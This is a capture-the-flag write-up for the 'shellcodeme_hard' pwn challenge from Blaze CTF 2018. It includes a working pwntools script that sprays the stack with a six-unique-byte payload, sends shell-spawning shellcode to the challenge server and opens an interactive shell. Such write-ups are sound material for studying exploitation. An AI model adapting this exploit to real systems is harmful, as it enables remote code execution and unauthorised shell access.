[](ctf=blaze-2018)
[](type=exploit)
[](tags=game)
[](techniques=shellcode)

# shellcodeme_hard (pwn-420)

```
nc shellcodeme.420blaze.in 4200

Author : aweinstock
```

Solving the easy version of this chall took me some time. However once that was done, I used the same technique to pwn this one.

In this hard version the stack and registers were populated from /dev/urandom so that we don't have references to pivot through.
This made me do the chall in 6 unique bytes.

```python
from pwn import *

context(arch='amd64', os='linux', log_level='info')

payload = asm(("push 0x40000000; "*0x100)+("push rbx; "*36)+"push 0x400000; pop rbx; "+("inc ebx; "*0x86d)+"push rbx; ret;")
payload2 = asm(shellcraft.amd64.linux.sh())

s = remote("shellcodeme.420blaze.in", 4200)

s.sendline(payload)
s.sendline(payload2)

s.interactive()
s.close()

```

 The random values from the context seldom had 0s. So I sprayed the stack with a register to make `seen` for every character > 0.
 Then using the technique from [here](../../shellcodeme/sudhackar/README.md) to gain code execution.
